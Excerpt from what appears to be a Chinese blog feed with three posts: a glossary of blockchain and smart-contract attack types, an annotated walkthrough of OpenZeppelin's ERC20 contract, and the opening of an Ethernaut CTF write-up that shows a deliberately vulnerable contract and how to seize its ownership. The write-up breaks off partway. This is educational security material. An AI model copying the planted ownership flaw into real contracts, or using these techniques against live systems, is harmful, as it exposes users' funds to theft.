<h2 id="一些公链攻击方式"><a href="#一些公链攻击方式" class="headerlink" title="一些公链攻击方式"></a>一些公链攻击方式</h2><h3 id="恶意挖矿攻击-Cryptojacking-Attack"><a href="#恶意挖矿攻击-Cryptojacking-Attack" class="headerlink" title="恶意挖矿攻击 Cryptojacking Attack"></a>恶意挖矿攻击 Cryptojacking Attack</h3><p>指未授权下劫持用户设备挖掘加密货币。</p>
<h3 id="无利益攻击-Nothin-at-Stake-Attack"><a href="#无利益攻击-Nothin-at-Stake-Attack" class="headerlink" title="无利益攻击 Nothin at Stake Attack"></a>无利益攻击 Nothin at Stake Attack</h3><p>可以简单概括为“作恶无成本，好处无限多”。当 PoS 共识系统出现分叉(Fork)时，出块节点可以在“不受任何损失”的前提下，同时在两个分叉上出块；无论哪一个分叉后面被公认为主链，该节点都可以获得“所有收益”且不会有任何成本损失。这就很容易给某些节点一种动力去产生新的分叉，支持或发起不合法交易，其他逐利的出块节点会同时在多条链(窗口)上排队出块支持新的分叉。随着时间的推移，分叉越来越多，非法交易，作恶猖狂。区块链将不再是唯一链，所有出块节点没有办法达成共识。</p>
<p>为了预防这样的情况发生，许多类 PoS 共识机制对此的解决方法是引入惩罚机制，对作恶的节点进行经济惩罚(Slashing)，以建立更加稳定的网络。DPoS 实际上也是无利益攻击的解决方案之一，由上文我们可知 DPoS 这个机制由持币人选出出块节点来运营网络，出块节点会将一部分奖励分给投票者。</p>
<h3 id="双花攻击-Double-Spend-Attack"><a href="#双花攻击-Double-Spend-Attack" class="headerlink" title="双花攻击 Double Spend Attack"></a>双花攻击 Double Spend Attack</h3><p>即一笔钱花了两次，双重支付，利用货币的数字特性两次或多次使用“同一笔钱”完成支付。双花不会产生新的 Token，但能把自己花出去的钱重新拿回来。简单说就是，攻击者将一笔 Token 转到另外一个地址，通常是转到交易所进行套现，然后再利用一些攻击手法对转账交易进行回滚。</p>
<p>目前有常见的几种手法能够引发双花攻击：</p>
<h4 id="01-Race-Attack"><a href="#01-Race-Attack" class="headerlink" title="01 Race Attack"></a>01 Race Attack</h4><p>这种攻击主要通过控制矿工费来实现双花。</p>
<h4 id="02-Finney-Attack"><a href="#02-Finney-Attack" class="headerlink" title="02 Finney Attack"></a>02 Finney Attack</h4><p>攻击者主要通过控制区块的广播时间来实现双花，攻击对象针对的是接受0确认的商家。</p>
<h4 id="03-Vector76-Attack"><a href="#03-Vector76-Attack" class="headerlink" title="03 Vector76 Attack"></a>03 Vector76 Attack</h4><p>又称“一次确认攻击”，也就是交易确认一次后仍然可以回滚，是 Finney Attack 和 Race Attack 的组合</p>
<h4 id="04-51-Attack"><a href="#04-51-Attack" class="headerlink" title="04 51% Attack"></a>04 51% Attack</h4><p>攻击者占有超过全网50%的算力，在攻击者控制算力的这段时间，他可以创造一条高度大于原来链的新链。那么旧链中的交易会被回滚，攻击者可以使用同一笔 Token 发送一笔新的交易到新链上。</p>
<h3 id="软分叉-Soft-fork"><a href="#软分叉-Soft-fork" class="headerlink" title="软分叉 Soft-fork"></a>软分叉 Soft-fork</h3><p>当新共识规则发布后，没有升级的旧节点并不会意识到代码已经发生改变，而继续生产不合法的区块，就会产生临时性分叉。</p>
<h3 id="硬分叉-Hard-fork"><a href="#硬分叉-Hard-fork" class="headerlink" title="硬分叉 Hard-fork"></a>硬分叉 Hard-fork</h3><p>在新共识规则发布后，已经升级的节点无法验证未升级节点产生的区块，未升级节点也无法验证已经升级的节点产生新的区块，即新旧节点互不兼容，原有正常的一条链被分成了两条链。</p>
<h3 id="异形攻击-Alien-Attack"><a href="#异形攻击-Alien-Attack" class="headerlink" title="异形攻击 Alien Attack"></a>异形攻击 Alien Attack</h3><p>又称地址池污染，是指诱使同类链的节点互相侵入的一种攻击手法，漏洞的主要原因是同类链系统在通信协议上没有对不同链的节点做识别。</p>
<h3 id="钓鱼攻击-Phishing"><a href="#钓鱼攻击-Phishing" class="headerlink" title="钓鱼攻击 Phishing"></a>钓鱼攻击 Phishing</h3><p>社工，套取用户名、密码、私钥等私密信息。</p>
<h3 id="木马攻击-Trojan-Horse-Attack"><a href="#木马攻击-Trojan-Horse-Attack" class="headerlink" title="木马攻击 Trojan Horse Attack"></a>木马攻击 Trojan Horse Attack</h3><p>木马病毒</p>
<h3 id="供应链攻击-Supply-Chain-Attack"><a href="#供应链攻击-Supply-Chain-Attack" class="headerlink" title="供应链攻击 Supply Chain Attack"></a>供应链攻击 Supply Chain Attack</h3><p>由于现在的软件工程，各种包&#x2F;模块的依赖十分频繁、常见，而开发者们很难做到一一检查，默认都过于信任市面上流通的包管理器。</p>
<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p>一种计算机协议，是以数字方式促进、验证或执行合同的谈判或履行。在区块链领域中，智能合约本质可以说是一段运行在区块链网络中的代码，它以计算机指令的方式实现了传统合约的自动化处理，完成用户所赋予的业务逻辑。</p>
<h3 id="交易回滚攻击-Roll-Back-Attack"><a href="#交易回滚攻击-Roll-Back-Attack" class="headerlink" title="交易回滚攻击 Roll Back Attack"></a>交易回滚攻击 Roll Back Attack</h3><p>指的是能对交易的状态进行回滚，回滚指的是将已经发生的交易编程未发生的状态。即攻击者已经完成了支付动作，但是通过某些手段，让转账流程发生错误，从而回滚整个交易流程。</p>
<h3 id="交易排挤攻击-Transaction-Congestion-Attack"><a href="#交易排挤攻击-Transaction-Congestion-Attack" class="headerlink" title="交易排挤攻击 Transaction Congestion Attack"></a>交易排挤攻击 Transaction Congestion Attack</h3><p>是针对 EOS 上的使用 defer 进行开奖的游戏合约的一种攻击手法，攻击者可以通过某些手段，在游戏合约的 defer 开奖交易前发送大量的 defer 交易，恶意侵占区块内的 CPU 资源，使得智能合约内本应在指定区块内执行的 defer 开奖交易因资源不足无法执行，只能去到下一个区块才执行。</p>
<p>由于很多 EOS 上的游戏智能合约使用区块信息作为智能合约本身的随机数，同一个 defer 开奖交易在不同区块内的执行结果是不一样的。通过这样的方式，攻击者在获知无法中奖的时候，就通过发送大量的 defer 交易，强行让智能合约重新开奖，从而达到攻击目的。</p>
<h3 id="随机数攻击-Random-Number-Attack"><a href="#随机数攻击-Random-Number-Attack" class="headerlink" title="随机数攻击 Random Number Attack"></a>随机数攻击 Random Number Attack</h3><p>就是针对智能合约的随机数生成算法进行攻击，预测只能合约的随机数。</p>
<h3 id="状态攻击-hard-fail-Attack"><a href="#状态攻击-hard-fail-Attack" class="headerlink" title="状态攻击 hard_fail Attack"></a>状态攻击 hard_fail Attack</h3><p>hard-fail 是 EOS 上的一种交易状态（共有 executed、soft_fail、hard_fail、delayed、expired 这5种），发生在出现错误但是没有使用错误处理器（error handler）处理错误的情况下。通常在链上大部分人观察到的交易，都是 execute 或 delayed 的，而没有失败的交易。攻击者利用这个细节，针对链上游戏或交易所进行攻击，构造执行状态为 hard_fail 的交易，欺骗链上游戏或交易所进行假充值攻击，从而获利。</p>
<h3 id="重放攻击-Replay-Attack"><a href="#重放攻击-Replay-Attack" class="headerlink" title="重放攻击 Replay Attack"></a>重放攻击 Replay Attack</h3><p>是针对区块链上的交易信息进行重放，一般来说，区块链会对交易进行各种验证，包括交易的时间戳、nonce、交易id 等。这种场景一般需要用户对某一条消息进行签名后上传给智能合约，然后再合约内部进行验签。但由于用户的签名信息是会上链的，也就是说每个人都能拿到用户的签名信息，如果被签名的消息不存在随着交易次数变化的变量，如时间戳、nonce 等，攻击者就可以拿着用户的签名，伪造用户发起交易，从而获利。</p>
<h3 id="重入攻击-Reentrancy-Attack"><a href="#重入攻击-Reentrancy-Attack" class="headerlink" title="重入攻击 Reentrancy Attack"></a>重入攻击 Reentrancy Attack</h3><p>首次出现于以太坊，对应的真实攻击为 The DAO 攻击，此次攻击还导致了原来的以太坊分叉成以太经典（ETC）和现在的以太坊（ETH）。由于项目方采用的转账模型为先给用户发送转账才对用户的余额状态进行修改，导致恶意用户可以构造恶意合约，在接受转账的同时再次调用项目方的转账函数。导致用户的余额状态没有被改变，却能一直提取项目方资金。</p>
<h3 id="假充值攻击-False-Top-up"><a href="#假充值攻击-False-Top-up" class="headerlink" title="假充值攻击 False Top-up"></a>假充值攻击 False Top-up</h3><p>分为针对只能合约的假充值攻击和对交易所的假充值攻击。在假充值攻击中，无论智能合约还是交易所本身，都没有收到真实的 Token，但是用户又得到了真实的充值记录。</p>
<ul>
<li><p><strong>智能合约假充值攻击：</strong></p>
<p>针对智能合约的假充值主要是假币的假充值，这种攻击手法多发于 EOS 和波场上。</p>
</li>
<li><p><strong>交易所假充值攻击：</strong></p>
<p>针对交易所的假充值攻击分为假币攻击和交易状态失败的假充值攻击。</p>
</li>
</ul>
<h3 id="短地址攻击-Short-Address-Attack"><a href="#短地址攻击-Short-Address-Attack" class="headerlink" title="短地址攻击 Short Address Attack"></a>短地址攻击 Short Address Attack</h3><p>是针对以太坊上 ERC20 智能合约的一种攻击形式，利用的是 EVM 中的对于输入字节码的自动补全机制进行攻击。</p>
<h3 id="假币攻击-Fake-Token-Attack"><a href="#假币攻击-Fake-Token-Attack" class="headerlink" title="假币攻击 Fake Token Attack"></a>假币攻击 Fake Token Attack</h3><p>收款方对一些 Token 进行收款的时候没有严格校验这些 Token 特有的标记，攻击就会发生。</p>
<h3 id="整型溢出攻击-Interger-Overflow-Attack"><a href="#整型溢出攻击-Interger-Overflow-Attack" class="headerlink" title="整型溢出攻击 Interger Overflow Attack"></a>整型溢出攻击 Interger Overflow Attack</h3><p>略。</p>
<h3 id="条件竞争攻击-Race-Condition"><a href="#条件竞争攻击-Race-Condition" class="headerlink" title="条件竞争攻击 Race Condition"></a>条件竞争攻击 Race Condition</h3><p>重入攻击（Reentrancy Attack）是条件竞争的一种。略。</p>
<h3 id="越权访问攻击-Exceed-Authority-Access-Attack"><a href="#越权访问攻击-Exceed-Authority-Access-Attack" class="headerlink" title="越权访问攻击 Exceed Authority Access Attack"></a>越权访问攻击 Exceed Authority Access Attack</h3><p>略。</p>
<h3 id="交易顺序依赖攻击-Transaction-Ordering-Attack"><a href="#交易顺序依赖攻击-Transaction-Ordering-Attack" class="headerlink" title="交易顺序依赖攻击 Transaction-Ordering Attack"></a>交易顺序依赖攻击 Transaction-Ordering Attack</h3><p>在区块链的世界当中，一笔交易内可能含有多个不同的交易，而这些交易执行的顺序会影响最终的交易的执行结果，由于在挖矿机制的区块链中，交易未被打包前都处于一种待打包的 pending 状态，如果能事先知道交易里面执行了哪些其他交易，恶意用户就能通过增加矿工费的形式，发起一笔交易，让交易中的其中一笔交易先行打包，扰乱交易顺序，造成非预期内的执行结果，达成攻击。</p>
<h3 id="女巫攻击-Sybil-Attack"><a href="#女巫攻击-Sybil-Attack" class="headerlink" title="女巫攻击 Sybil Attack"></a>女巫攻击 Sybil Attack</h3><p>某个恶意节点可以伪装成多个节点，向被攻击节点发出链接请求，导致节点没办法接受其他节点的请求，造成节点拒绝服务攻击。</p>
<h3 id="假错误通知攻击-Fake-Onerror-Notification-Attack"><a href="#假错误通知攻击-Fake-Onerror-Notification-Attack" class="headerlink" title="假错误通知攻击 Fake Onerror Notification Attack"></a>假错误通知攻击 Fake Onerror Notification Attack</h3><p>如果合约没有对 onerror 通知的来源合约是否是 eosio 进行检验的话，就会触发合约中对 onerror 的处理，从而导致被攻击合约资产遭受损失。</p>
<h3 id="粉尘攻击-Dusting-Attack"><a href="#粉尘攻击-Dusting-Attack" class="headerlink" title="粉尘攻击 Dusting Attack"></a>粉尘攻击 Dusting Attack</h3><p>粉尘攻击最早发生于比特币网络中，粉尘指的是交易中的交易金额相对于正常交易而言十分地小，可以视作微不足道的粉尘。在采用 UTXO 模型作为账户资金系统的比特币中，通过给大量的账户发送这些粉尘金额，令交易粉尘化，然后再通过追踪这些粉尘交易，关联出该地址的其他关联地址，通过对这些关联地址进行行为分析，社工出一个地址背后的公司或个人，破坏比特币本身的匿名性。同时，大量的粉尘交易会造成区块的拥堵，使得手续费提升，进而产生大量待打包交易，降低系统本身的运行效率。</p>
<h3 id="C2攻击-C2-Attack"><a href="#C2攻击-C2-Attack" class="headerlink" title="C2攻击 C2 Attack"></a>C2攻击 C2 Attack</h3><p>C2 全称 Command and Control，命令执行与控制。</p>
<h3 id="洗币-Money-Laundering"><a href="#洗币-Money-Laundering" class="headerlink" title="洗币 Money Laundering"></a>洗币 Money Laundering</h3><p>略。</p>
<h3 id="勒索-Ransom"><a href="#勒索-Ransom" class="headerlink" title="勒索 Ransom"></a>勒索 Ransom</h3><p>略。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
  </entry>
  <entry>
    <title>浅析ERC-20</title>
    <url>/2023/12/03/%E6%B5%85%E6%9E%90ERC-20/</url>
    <content><![CDATA[<h2 id="关于-ERC-20"><a href="#关于-ERC-20" class="headerlink" title="关于 ERC-20"></a>关于 ERC-20</h2><p>GitHub：<a class="link"   href="https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md" >ethereum&#x2F;ERCS&#x2F;erc-20.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>代币在以太坊中十分重要，它可以与现实中的价值互相换算，也可以纯粹地表示一个虚拟的数值。</p>
<p>ERC-20（Ethereum Request for Comments 20）是一个以太坊代币的标准，由 Fabian Vogelsteller 于2015年11月提出，是一种代币标准，为智能合约中的代币实现 API。</p>
<p>一个符合 ERC-20 标准的代币合约，至少要实现以下功能：</p>
<ul>
<li>代币的转移，从一个账户到另一个账户</li>
<li>获取当前账户的余额</li>
<li>获取该代币的总供应量</li>
<li>授权给第三方账户使用账户中一定数量的代币</li>
</ul>
<h2 id="ERC20-in-OpenZeppelin-Contracts"><a href="#ERC20-in-OpenZeppelin-Contracts" class="headerlink" title="ERC20 in OpenZeppelin Contracts"></a>ERC20 in OpenZeppelin Contracts</h2><p>GitHub：<a class="link"   href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol" >openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.20;

import &#123;IERC20&#125; from &quot;./IERC20.sol&quot;;
import &#123;IERC20Metadata&#125; from &quot;./extensions/IERC20Metadata.sol&quot;;
import &#123;Context&#125; from &quot;../../utils/Context.sol&quot;;
import &#123;IERC20Errors&#125; from &quot;../../interfaces/draft-IERC6093.sol&quot;;

abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors &#123;
    mapping(address account =&gt; uint256) private _balances;
    // 映射：余额

    mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;
    // 映射：授权余额，account对spender授权的余额，即前者允许后者访问一定数量的代币

    uint256 private _totalSupply;
    // 总供应量

    string private _name;
    // 代币名称
    string private _symbol;
    // 代币符号

    constructor(string memory name_, string memory symbol_) &#123;
        // 构造函数初始化名称和符号
        _name = name_;
        _symbol = symbol_;
    &#125;

    function name() public view virtual returns (string memory) &#123;
        // name的getter
        return _name;
    &#125;

    function symbol() public view virtual returns (string memory) &#123;
        // symbol的getter
        return _symbol;
    &#125;

    function decimals() public view virtual returns (uint8) &#123;
        // 小数位
        return 18;
    &#125;

    function totalSupply() public view virtual returns (uint256) &#123;
        // 总供应量的getter
        return _totalSupply;
    &#125;

    function balanceOf(address account) public view virtual returns (uint256) &#123;
        // 余额getter
        return _balances[account];
    &#125;

    function transfer(address to, uint256 value) public virtual returns (bool) &#123;
        // 转账函数，可重写，调用内部函数_transfer()
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    &#125;

    function allowance(address owner, address spender) public view virtual returns (uint256) &#123;
        // 授权映射的getter
        return _allowances[owner][spender];
    &#125;

    function approve(address spender, uint256 value) public virtual returns (bool) &#123;
        // 授权函数，可重写，调用内部函数_approve()
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    &#125;

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;
        // 从from地址转出value数量到to地址，调用内部函数_transfer()
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        // 注意这里_transfer()从from转到to，扣除了spender的allowance和from的balance

        return true;
    &#125;

    function _transfer(address from, address to, uint256 value) internal &#123;
        // 内部函数，检测到空地址即抛出异常，调用内部函数）_update()
        if (from == address(0)) &#123;
            revert ERC20InvalidSender(address(0));
        &#125;
        if (to == address(0)) &#123;
            revert ERC20InvalidReceiver(address(0));
        &#125;
        _update(from, to, value);
    &#125;

    function _update(address from, address to, uint256 value) internal virtual &#123;
        // 内部函数，转移代币的核心功能
        if (from == address(0)) &#123;
            // from为空地址时，凭空产生代币，总供应量增加。这里对应的就是_mint()
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        &#125; else &#123;
            uint256 fromBalance = _balances[from];
            if (fromBalance &lt; value) &#123;
                // 不够钱
                revert ERC20InsufficientBalance(from, fromBalance, value);
            &#125;
            unchecked &#123;
                // 排除溢出的可能，所以可以使用unchecked
                // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.
                _balances[from] = fromBalance - value;
            &#125;
        &#125;

        if (to == address(0)) &#123;
            // to为空地址时，销毁代币，总供应量减少。这里对应的就是_burn()
            unchecked &#123;
                _totalSupply -= value;
            &#125;
        &#125; else &#123;
            unchecked &#123;
                _balances[to] += value;
            &#125;
        &#125;

        emit Transfer(from, to, value);
        // 触发Transfer事件
    &#125;

    function _mint(address account, uint256 value) internal &#123;
        // 产生代币
        if (account == address(0)) &#123;
            revert ERC20InvalidReceiver(address(0));
        &#125;
        _update(address(0), account, value);
    &#125;

    function _burn(address account, uint256 value) internal &#123;
        // 销毁代币
        if (account == address(0)) &#123;
            revert ERC20InvalidSender(address(0));
        &#125;
        _update(account, address(0), value);
    &#125;

    function _approve(address owner, address spender, uint256 value) internal &#123;
        // 授权额度，去调用它的一个重写，emitEvent默认传入true
        _approve(owner, spender, value, true);
    &#125;

    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;
        // 比另一个_approve()多出一个bool参数emitEvent，用于选择是否触发Approval事件
        if (owner == address(0)) &#123;
            revert ERC20InvalidApprover(address(0));
        &#125;
        if (spender == address(0)) &#123;
            revert ERC20InvalidSpender(address(0));
        &#125;
        _allowances[owner][spender] = value; // 基于spender相应代币数量的授权
        if (emitEvent) &#123;
            emit Approval(owner, spender, value);
        &#125;
    &#125;

    function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;
        // 花费授权的额度，内部函数
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) &#123;
            if (currentAllowance &lt; value) &#123;
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            &#125;
            unchecked &#123;
                _approve(owner, spender, currentAllowance - value, false);
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p>以上是 OpenZeppelin Contracts 的 ERC20.sol，我隐去了代码中开发者留下的详细英文注释，取而代之的是一些简洁的注释，有误敬请斧正。</p>
<h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><pre><code class="solidity">string private _name;
string private _symbol;

constructor(string memory name_, string memory symbol_) &#123;
    _name = name_;
    _symbol = symbol_;
&#125;
</code></pre>
<p>构造函数，接收<code>name_</code>和<code>symbol_</code>两个参数，初始化代币的名称和符号。</p>
<h3 id="public-函数"><a href="#public-函数" class="headerlink" title="public 函数"></a>public 函数</h3><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><pre><code class="solidity">string private _name;

function name() public view virtual returns (string memory) &#123;
    return _name;
&#125;
</code></pre>
<p>返回代币名称。</p>
<h4 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h4><pre><code class="solidity">string private _symbol;

function symbol() public view virtual returns (string memory) &#123;
    return _symbol;
&#125;
</code></pre>
<p>返回代币符号。</p>
<h4 id="decimals"><a href="#decimals" class="headerlink" title="decimals"></a>decimals</h4><pre><code class="solidity">function decimals() public view virtual returns (uint8) &#123;
    return 18;
&#125;
</code></pre>
<p>返回代币使用的小数位数。</p>
<h4 id="totalSupply"><a href="#totalSupply" class="headerlink" title="totalSupply"></a>totalSupply</h4><pre><code class="solidity">uint256 private _totalSupply;

function totalSupply() public view virtual returns (uint256) &#123;
    return _totalSupply;
&#125;
</code></pre>
<p>返回代币总供应量。</p>
<h4 id="balanceOf"><a href="#balanceOf" class="headerlink" title="balanceOf"></a>balanceOf</h4><pre><code class="solidity">mapping(address account =&gt; uint256) private _balances;

function balanceOf(address account) public view virtual returns (uint256) &#123;
    return _balances[account];
&#125;
</code></pre>
<p>从<code>_balances</code>映射中返回相应账户的余额。</p>
<h4 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h4><pre><code class="solidity">function transfer(address to, uint256 value) public virtual returns (bool) &#123;
    address owner = _msgSender();
    _transfer(owner, to, value);
    return true;
&#125;
</code></pre>
<p>转账函数，可见性为<code>public</code>，用于获取目前的<code>msg.sender</code>并将其作为<code>from</code>参数传入内部函数<code>_transfer</code>，以执行下一步转账操作。</p>
<h4 id="allowance"><a href="#allowance" class="headerlink" title="allowance"></a>allowance</h4><pre><code class="solidity">mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;

function allowance(address owner, address spender) public view virtual returns (uint256) &#123;
    return _allowances[owner][spender];
&#125;
</code></pre>
<p>从<code>_allowances</code>映射中返回相应授权者账户和被授权账户的授权额。</p>
<h4 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h4><pre><code class="solidity">function approve(address spender, uint256 value) public virtual returns (bool) &#123;
    address owner = _msgSender();
    _approve(owner, spender, value);
    return true;
&#125;
</code></pre>
<p>授权函数，可见性为<code>public</code>，用于获取目前的<code>msg.sender</code>并将其作为<code>owner</code>参数传入内部函数<code>_approve</code>，以执行下一步授权操作。</p>
<h4 id="transferFrom"><a href="#transferFrom" class="headerlink" title="transferFrom"></a>transferFrom</h4><pre><code class="solidity">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;
    address spender = _msgSender();
    _spendAllowance(from, spender, value);
    _transfer(from, to, value);
    return true;
&#125;
</code></pre>
<p>使用授权的代币进行转账，获取当前<code>msg.sender</code>作为<code>spender</code>参数传入内部函数<code>_spendAllowance</code>，执行成功后再调用<code>_transfer</code>内部函数转移代币。</p>
<h3 id="internal-函数"><a href="#internal-函数" class="headerlink" title="internal 函数"></a>internal 函数</h3><h4 id="transfer-1"><a href="#transfer-1" class="headerlink" title="_transfer"></a>_transfer</h4><pre><code class="solidity">function _transfer(address from, address to, uint256 value) internal &#123;
    if (from == address(0)) &#123;
        revert ERC20InvalidSender(address(0));
    &#125;
    if (to == address(0)) &#123;
        revert ERC20InvalidReceiver(address(0));
    &#125;
    _update(from, to, value);
&#125;
</code></pre>
<p>内部函数，判断<code>from</code>和<code>to</code>是否为空地址，是则<code>revert</code>，否则调用内部函数<code>_update</code>，执行下一步转账操作。</p>
<h4 id="update"><a href="#update" class="headerlink" title="_update"></a>_update</h4><pre><code class="solidity">function _update(address from, address to, uint256 value) internal virtual &#123;
    if (from == address(0)) &#123;
        _totalSupply += value;
    &#125; else &#123;
        uint256 fromBalance = _balances[from];
        if (fromBalance &lt; value) &#123;
            revert ERC20InsufficientBalance(from, fromBalance, value);
        &#125;
        unchecked &#123;
            _balances[from] = fromBalance - value;
        &#125;
    &#125;
    if (to == address(0)) &#123;
        unchecked &#123;
            _totalSupply -= value;
        &#125;
    &#125; else &#123;
        unchecked &#123;
            _balances[to] += value;
        &#125;
    &#125;
    emit Transfer(from, to, value);
&#125;
</code></pre>
<p>代币转移的核心代码，内部函数。第一个 if 中判断<code>from</code>是否为空地址，是则凭空产生代币，另一个内部函数<code>_mint</code>会这样调用它。else 中是既不产生代币也不销毁代币的正常转账，判断<code>fromBalance</code>足够即可转账。第二个 if 中判断<code>to</code>是否为空地址，是则销毁代币，另一个内部函数<code>_burn</code>会这样调用它。执行完代币转移的操作后，触发一个 Transfer 事件。</p>
<h4 id="mint"><a href="#mint" class="headerlink" title="_mint"></a>_mint</h4><pre><code class="solidity">function _mint(address account, uint256 value) internal &#123;
    if (account == address(0)) &#123;
        revert ERC20InvalidReceiver(address(0));
    &#125;
    _update(address(0), account, value);
&#125;
</code></pre>
<p>内部函数，用于凭空在一个账户的余额中生成代币，传入的账户为空地址则 revert，否则直接去调用<code>_update</code>。</p>
<h4 id="burn"><a href="#burn" class="headerlink" title="_burn"></a>_burn</h4><pre><code class="solidity">function _burn(address account, uint256 value) internal &#123;
    if (account == address(0)) &#123;
        revert ERC20InvalidSender(address(0));
    &#125;
    _update(account, address(0), value);
&#125;
</code></pre>
<p>内部函数，用于销毁一个账户中的代币余额，传入的账户地址为空地址则 revert，否则直接去调用<code>_update</code>。</p>
<h4 id="approve-1"><a href="#approve-1" class="headerlink" title="_approve"></a>_approve</h4><pre><code class="solidity">function _approve(address owner, address spender, uint256 value) internal &#123;
    _approve(owner, spender, value, true);
&#125;

function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;
    if (owner == address(0)) &#123;
        revert ERC20InvalidApprover(address(0));
    &#125;
    if (spender == address(0)) &#123;
        revert ERC20InvalidSpender(address(0));
    &#125;
    _allowances[owner][spender] = value;
    if (emitEvent) &#123;
        emit Approval(owner, spender, value);
    &#125;
&#125;
</code></pre>
<p>内部函数，用于将<code>owner</code>的一定量代币授权给<code>spender</code>，有两种用法，目的是使<code>emitEvent</code>缺省为 true。</p>
<h4 id="spendAllowance"><a href="#spendAllowance" class="headerlink" title="_spendAllowance"></a>_spendAllowance</h4><pre><code class="solidity">function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;
    uint256 currentAllowance = allowance(owner, spender);
    if (currentAllowance != type(uint256).max) &#123;
        if (currentAllowance &lt; value) &#123;
            revert ERC20InsufficientAllowance(spender, currentAllowance, value);
        &#125;
        unchecked &#123;
            _approve(owner, spender, currentAllowance - value, false);
        &#125;
    &#125;
&#125;
</code></pre>
<p>内部函数，当被授权者使用<code>transferFrom</code>函数，转移其被授权的代币时被调用，用于扣除其相应的授权额度。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Ethernaut WP _持续更新中。。。</title>
    <url>/2023/10/07/Ethernaut-wp/</url>
    <content><![CDATA[<h2 id="00-Hello-Ethernaut"><a href="#00-Hello-Ethernaut" class="headerlink" title="00 Hello Ethernaut"></a>00 Hello Ethernaut</h2><p>这是引导的关卡，只需要配置好 MetaMask ，支付一些测试币，然后在控制台与合约进行互动，即可过关。</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Instance &#123;

  string public password;
  uint8 public infoNum = 42;
  string public theMethodName = &#39;The method name is method7123949.&#39;;
  bool private cleared = false;

  // constructor
  constructor(string memory _password) &#123;
    password = _password;
  &#125;

  function info() public pure returns (string memory) &#123;
    return &#39;You will find what you need in info1().&#39;;
  &#125;

  function info1() public pure returns (string memory) &#123;
    return &#39;Try info2(), but with &quot;hello&quot; as a parameter.&#39;;
  &#125;

  function info2(string memory param) public pure returns (string memory) &#123;
    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&#39;hello&#39;))) &#123;
      return &#39;The property infoNum holds the number of the next info method to call.&#39;;
    &#125;
    return &#39;Wrong parameter.&#39;;
  &#125;

  function info42() public pure returns (string memory) &#123;
    return &#39;theMethodName is the name of the next method.&#39;;
  &#125;

  function method7123949() public pure returns (string memory) &#123;
    return &#39;If you know the password, submit it to authenticate().&#39;;
  &#125;

  function authenticate(string memory passkey) public &#123;
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;
      cleared = true;
    &#125;
  &#125;

  function getCleared() public view returns (bool) &#123;
    return cleared;
  &#125;
&#125;
</code></pre>
<h2 id="01-Fallback"><a href="#01-Fallback" class="headerlink" title="01 Fallback"></a>01 Fallback</h2><p>这是一道白盒题目，源码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback &#123;

  mapping(address =&gt; uint) public contributions;
  address public owner;

  constructor() &#123;
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  &#125;

  modifier onlyOwner &#123;
        require(
            msg.sender == owner,
            &quot;caller is not the owner&quot;
        );
        _;
    &#125;

  function contribute() public payable &#123;
    require(msg.value &lt; 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] &gt; contributions[owner]) &#123;
      owner = msg.sender;
    &#125;
  &#125;

  function getContribution() public view returns (uint) &#123;
    return contributions[msg.sender];
  &#125;

  function withdraw() public onlyOwner &#123;
    payable(owner).transfer(address(this).balance);
  &#125;

  receive() external payable &#123;
    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
    owner = msg.sender;
  &#125;
&#125;
</code></pre>
<p>题目要求：</p>
<ul>
<li>获得这个合约的所有权</li>
<li>把它的余额减到0</li>
</ul>
<p>分析源码，成为合约的 owner 有两种方式：</p>
<ol>
<li>通过不停贡献合约，使当前用户贡献值大于 owner</li>
<li>在已有贡献记录的前提下，向合约发送大于零的以太币</li>
</ol>
<p>由于单次贡献的额度被限制到了0.001ETH 以下，所以不可能通过第一种方式成为 owner（要贡献100万次捏）。那么试一下第二种方式：</p>
<p>首先我们把合约跑起来，可以看到 owner 有很高的初始贡献值：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
